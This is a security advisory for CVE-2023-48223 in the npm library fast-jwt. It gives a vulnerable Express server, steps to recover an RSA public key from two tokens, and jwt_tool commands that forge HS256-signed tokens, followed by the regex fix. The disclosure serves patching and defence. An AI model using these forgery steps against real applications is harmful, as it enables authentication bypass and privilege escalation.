# [M] JWT Algorithm Confusion

## Summary
Severity: Medium
Advisory: GHSA-c2ff-88x2-x9pg
CVE: CVE-2023-48223
CWE: CWE-20
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2023-11-20
Source: https://github.com/advisories/GHSA-c2ff-88x2-x9pg
Type: github-advisory

## Affected
- npm: `fast-jwt` — affected >=0 <3.3.2

## Details
### Summary
The fast-jwt library does not properly prevent JWT algorithm confusion for all public key types.

### Details
The 'publicKeyPemMatcher' in 'fast-jwt/src/crypto.js' does not properly match all common PEM formats for public keys. To exploit this vulnerability, an attacker needs to craft a malicious JWT token containing the HS256 algorithm, signed with the public RSA key of the victim application. This attack will only work if the victim application utilizes a public key containing the `BEGIN RSA PUBLIC KEY` header.

### PoC
Take a server running the following code:
```javascript
const express = require('express');
const { createSigner, createVerifier } = require('fast-jwt')
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

// Load the keys from the file
const publicKeyPath = path.join(__dirname, 'public_key.pem');
const publicKey = fs.readFileSync(publicKeyPath, 'utf8');
const privateKeyPath = path.join(__dirname, 'key');
const privateKey = fs.readFileSync(privateKeyPath, 'utf8');

app.use(express.json());

// Endpoint to generate a JWT token with admin: False
app.get('/generateToken', async (req, res) => {
  const payload = { admin: false, name: req.query.name };

  const signSync = createSigner({ algorithm: 'RS256', key: privateKey });
  const token = signSync(payload);
  
  res.json({ token });
});

// Middleware to verify the JWT token
function verifyToken(req, res, next) {
  const token = req.query.token;

  const verifySync = createVerifier({ key: publicKey });
  const payload = verifySync(token);

  req.decoded = payload;
  next();
}

// Endpoint to check if you are the admin or not
app.get('/checkAdmin', verifyToken, (req, res) => {
  res.json(req.decoded);
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
```

Assume the server generated their keys like follows:
```
ssh-keygen -t rsa -b 2048 -m PEM
ssh-keygen -f key.pub -e -m PEM > public_key.pem
```

**Public key recovery**
First, an attacker needs to recover the public key from the server in any way possible. It is possible to extract this from just two JWT tokens as shown below.
Grab two different JWT tokens and utilize the following tool: `https://github.com/silentsignal/rsa_sign2n/blob/release/standalone/jwt_forgery.py`
```
python3 jwt_forgery.py token1 token2
```
The tool will generate 4 different public keys, all in different formats. Try the following for all 4 formats.

**Algorithm confusion**
Change the JWT to the HS256 algorithm and modify any of the contents to your liking at `https://jwt.io/`.
Copy the resulting JWT token and use with the following tool: `https://github.com/ticarpi/jwt_tool`
```
python /opt/jwt_tool/jwt_tool.py --exploit k -pk public_key token
```
You will now get a resulting JWT token that is validly signed.

### Impact
Applications using the RS256 algorithm, a public key with a `BEGIN RSA PUBLIC KEY` header, and calling the verify function without explicitly providing an algorithm, are vulnerable to this algorithm confusion attack which allows attackers to sign arbitrary payloads which will be accepted by the verifier.

### Solution

Change https://github.com/nearform/fast-jwt/blob/master/src/crypto.js#L29

```javascript
const publicKeyPemMatcher = '-----BEGIN PUBLIC KEY-----'
```

to be regex: 

```javascript
const publicKeyPemMatcher = /^-----BEGIN( RSA)? PUBLIC KEY-----/
```

## References
- https://github.com/nearform/fast-jwt/security/advisories/GHSA-c2ff-88x2-x9pg
- https://nvd.nist.gov/vuln/detail/CVE-2023-48223
- https://github.com/nearform/fast-jwt/commit/15a6e92c9adb39acde41a9b11cec0cbde8ad763b
- https://github.com/nearform/fast-jwt
- https://github.com/nearform/fast-jwt/blob/master/src/crypto.js#L29
- https://github.com/nearform/fast-jwt/releases/tag/v3.3.2
